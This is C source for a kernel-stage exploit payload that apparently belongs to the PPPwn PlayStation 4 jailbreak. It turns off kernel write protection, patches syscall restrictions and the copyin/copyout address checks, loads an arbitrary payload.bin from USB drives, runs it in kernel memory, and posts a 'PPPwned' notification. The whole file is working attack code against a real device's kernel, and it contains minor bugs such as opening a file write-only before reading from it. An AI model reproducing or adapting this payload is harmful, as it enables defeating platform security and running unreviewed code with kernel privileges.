/*
 * Copyright (C) 2024 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

// clang-format off
#define _KERNEL
#include <stddef.h>
#include <string.h>
#include <sys/fcntl.h>
#include <sys/types.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/pcpu.h>
#include <sys/proc.h>
#include <machine/specialreg.h>
#include "offsets.h"
// clang-format on

#define STAGE3_SIZE 0x10000

// by OSM-Made
typedef struct {
  int type;
  int reqId;
  int priority;
  int msgId;
  int targetId;
  int userId;
  int unk1;
  int unk2;
  int appId;
  int errorNum;
  int unk3;
  unsigned char useIconImageUri;
  char message[1024];
  char iconUri[1024];
  char unk[1024];
} OrbisNotificationRequest;

struct sysent *sysents;

static inline uint64_t rdmsr(u_int msr) {
  uint32_t low, high;
  asm volatile("rdmsr" : "=a"(low), "=d"(high) : "c"(msr));
  return (low | ((uint64_t)high << 32));
}

static inline void load_cr0(u_long data) {
  asm volatile("movq %0, %%cr0" ::"r"(data));
}

static inline u_long rcr0(void) {
  u_long data;
  asm volatile("movq %%cr0, %0" : "=r"(data));
  return data;
}

static int ksys_open(struct thread *td, const char *path, int flags, int mode) {
  int (*sys_open)(struct thread *, struct open_args *) =
      (void *)sysents[SYS_open].sy_call;

  td->td_retval[0] = 0;

  struct open_args uap;
  uap.path = (char *)path;
  uap.flags = flags;
  uap.mode = mode;
  int error = sys_open(td, &uap);
  if (error) return -error;

  return td->td_retval[0];
}

static int ksys_write(struct thread *td, int fd, const void *buf,
                      size_t nbytes) {
  int (*sys_write)(struct thread *, struct write_args *) =
      (void *)sysents[SYS_write].sy_call;

  td->td_retval[0] = 0;

  struct write_args uap;
  uap.fd = fd;
  uap.buf = buf;
  uap.nbyte = nbytes;
  int error = sys_write(td, &uap);
  if (error) return -error;

  return td->td_retval[0];
}

static int ksys_read(struct thread* td, int fd, void* buf, size_t nbytes) {
    int(*sys_read)(struct thread*, struct read_args*) =
        (void*)sysents[SYS_read].sy_call;

    td->td_retval[0] = 0;

    struct read_args uap;
    uap.fd = fd;
    uap.buf = buf;
    uap.nbyte = nbytes;
    int error = sys_read(td, &uap);
    if (error)
        return -error;

    return td->td_retval[0];
}

static int ksys_close(struct thread *td, int fd) {
  int (*sys_close)(struct thread *, struct close_args *) =
      (void *)sysents[SYS_close].sy_call;

  td->td_retval[0] = 0;

  struct close_args uap;
  uap.fd = fd;
  int error = sys_close(td, &uap);
  if (error) return -error;

  return td->td_retval[0];
}

int ReadFile(struct thread* td, const char* path, void* buf, size_t nbytes)
{
    int fd = ksys_open(td, path, O_WRONLY, 0);

    if (!fd)
        return -1;

    int bytesRead = ksys_read(td, fd, buf, nbytes);

    ksys_close(td, fd);

    return bytesRead;
}

void stage2(void) {
  uint64_t kaslr_offset = rdmsr(MSR_LSTAR) - kdlsym_addr_Xfast_syscall;

  int (*printf)(const char *format, ...) = (void *)kdlsym(printf);

  void** kernel_map = (void**)kdlsym(kernel_map);
  void* (*kmem_alloc)(void*, uint64_t) = (void*)kdlsym(kmem_alloc);

  sysents = (struct sysent *)kdlsym(sysent);

  printf("stage2\n");

  // Disable write protection
  uint64_t cr0 = rcr0();
  load_cr0(cr0 & ~CR0_WP);

  // Allow syscalls everywhere
  *(uint32_t *)kdlsym(amd_syscall_patch1) = 0;
  *(uint16_t *)kdlsym(amd_syscall_patch2) = 0x9090;
  *(uint16_t *)kdlsym(amd_syscall_patch3) = 0x9090;
  *(uint8_t *)kdlsym(amd_syscall_patch4) = 0xeb;

  // Allow user and kernel addresses
  uint8_t nops[] = {0x90, 0x90, 0x90};

  *(uint16_t *)kdlsym(copyin_patch1) = 0x9090;
  memcpy((void *)kdlsym(copyin_patch2), nops, sizeof(nops));

  *(uint16_t *)kdlsym(copyout_patch1) = 0x9090;
  memcpy((void *)kdlsym(copyout_patch2), nops, sizeof(nops));

  *(uint16_t *)kdlsym(copyinstr_patch1) = 0x9090;
  memcpy((void *)kdlsym(copyinstr_patch2), nops, sizeof(nops));
  *(uint16_t *)kdlsym(copyinstr_patch3) = 0x9090;

  // Restore write protection
  load_cr0(cr0);

  struct thread* td = curthread;

  // Allocate space for payload.
  void* stage3 = kmem_alloc(*kernel_map, STAGE3_SIZE);

  // Read the payload from one of the usb devices.
  int res = ReadFile(td, "/mnt/usb0/payload.bin", stage3, STAGE3_SIZE);
  if (res < 0)
      res = ReadFile(td, "/mnt/usb1/payload.bin", stage3, STAGE3_SIZE);
  if (res < 0)
      res = ReadFile(td, "/mnt/usb2/payload.bin", stage3, STAGE3_SIZE);

  // Call entry point if we read the payload.
  if (res)
  {
      void (*entry)(void) = (void*)stage3;
      entry();
  }

  // Send notification
  OrbisNotificationRequest notify = {};
  notify.targetId = -1;
  notify.useIconImageUri = 1;
  memcpy(&notify.message, "PPPwned", 8);

  int fd;
  fd = ksys_open(td, "/dev/notification0", O_WRONLY, 0);
  if (!fd) fd = ksys_open(td, "/dev/notification0", O_WRONLY | O_NONBLOCK, 0);
  if (!fd) fd = ksys_open(td, "/dev/notification1", O_WRONLY, 0);
  if (!fd) fd = ksys_open(td, "/dev/notification1", O_WRONLY | O_NONBLOCK, 0);

  if (fd) {
    ksys_write(td, fd, &notify, sizeof(notify));
    ksys_close(td, fd);
  }
}
